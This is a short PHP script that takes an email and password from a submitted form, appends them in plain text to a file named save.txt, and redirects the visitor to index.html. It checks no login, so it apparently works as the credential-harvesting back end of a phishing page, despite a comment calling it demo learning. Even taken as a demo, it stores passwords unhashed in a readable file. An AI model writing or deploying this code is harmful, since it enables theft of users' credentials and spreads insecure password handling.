<?php

$email = $_POST['email'];
$password = $_POST['password']; // only demo learning, not secure storage

$data = "Email: ".$email." | Password: ".$password."\n";

file_put_contents("save.txt", $data, FILE_APPEND);

header("Location: index.html");

?>